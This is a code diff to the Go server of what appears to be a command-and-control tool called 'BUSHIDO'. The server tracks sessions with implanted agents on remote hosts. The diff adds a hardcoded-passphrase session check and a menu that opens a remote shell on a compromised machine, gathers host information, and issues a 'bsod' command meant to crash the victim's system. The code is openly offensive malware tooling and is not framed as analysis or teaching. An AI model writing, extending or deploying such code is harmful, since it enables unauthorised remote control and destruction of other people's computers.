@@ -7,6 +7,7 @@ import (
 	"net"
 	"os"
 	"strings"
+	"time"
 )
 
 func NewSessionList() *SessionList {
@@ -28,6 +29,30 @@ func (ll *SessionList) registerSession(port string, conn net.Conn) {
 	// Add to the head of the linked list
 	newSession.Next = ll.Head
 	ll.Head = newSession
+}
+
+func authSession(conn *net.Conn) bool {
+	auth := make([]byte, 32)
+	(*conn).SetReadDeadline(time.Now().Add(15 * time.Second))
+	n, err := (*conn).Read(auth)
+	if err != nil {
+		fmt.Println("Error reading from connection:", err)
+		return false
+	}
+	if n <= 1 {
+		fmt.Println("Error amount of data returned is less than 1")
+		return false
+	}
+	authString := string(auth[:n])
+
+	// Perform authentication
+	if authString != "i_L0V_y0U_Ju5t1n_P3t3R\n" {
+		fmt.Println("Authentication failed")
+		(*conn).Close()
+		return false
+	}
+	(*conn).SetReadDeadline(time.Time{})
+	return true
 }
 
 // displaySessions displays the active sessions
@@ -64,33 +89,7 @@ func (ll *SessionList) closeSessions() {
 	ll.Head = nil // Reset the listener list
 }
 
-// func isAliveQuick(conn *net.Conn) bool {
-// 	buff := make([]byte, 9000)
-// 	(*conn).Write([]byte("AreYouAlive"))
-// 	read_len, err := (*conn).Read([]byte(buff))
-// 	for i := 0; i < 3; i++ {
-// 		if read_len <= 1 {
-// 			fmt.Println("Something Went Wrong")
-// 			return false
-// 		}
-// 		if err != nil {
-// 			fmt.Println("Something Went Wrong")
-// 			return false
-// 		}
-// 		strBuff := string(buff)
-// 		fmt.Println(strBuff)
-// 		if strBuff == "IAMALIVE" {
-// 			fmt.Println("Agent is Alive")
-// 			return true
-// 		}
-// 		time.Sleep(5 * time.Second)
-// 	}
-// 	fmt.Println("Implant could not be reached")
-// 	return false
-// }
-
 func openSession(id int, sl *SessionList) {
-	//sl.displaySessions()
 	current := sl.Head
 	if current == nil {
 		fmt.Println("\nSession not found\n")
@@ -105,11 +104,9 @@ func openSession(id int, sl *SessionList) {
 	}
 	fmt.Println("\nSession Found !")
 	fmt.Println("Connecting ...")
-	//Impliment some sort of auth. Hash some string. If agent responds with the same hash super. If agent is late kill. If agent responds false kill.
-	// if !isAliveQuick(&current.Conn) {
-	// 	fmt.Println("Could Not Open the Session")
-	// 	return
-	// }
+	if !authSession(&current.Conn) {
+		return
+	}
 	fmt.Println("BUSHIDO Shell Open ...\n")
 	reader := bufio.NewReader(os.Stdin)
 
@@ -121,19 +118,25 @@ func openSession(id int, sl *SessionList) {
 			continue
 		}
 		command = strings.TrimSpace(command)
-		switch command {
+		switch command { //All of the func below will be found under bushido.go
 		case "shell":
 			shell(&current.Conn)
 		case "hostinfo":
 			hostinfo(&current.Conn)
-		case "bsod":
-			bsod(&current.Conn)
+		case "bsod": //FIX THIS. IT THROWS THE SERVER OUT OF SYNC WITH THE CLIENT. Fix it ClientSide a7la
+			if bsod(&current.Conn) {
+				fmt.Println("HOST BSOD !")
+				fmt.Println("Impliment Feature where the host is removed from the list when this happens")
+				return
+			} else {
+				fmt.Println("Couldn't BSOD the Host ...")
+			}
 		case "bg":
 			return
 		case "exit":
 			return
 		default:
-			fmt.Println("\nUsage: shell, hostinfo, bg\n")
+			fmt.Println("\nUsage: shell, hostinfo, bsod, bg\n")
 		}
 	}
 }
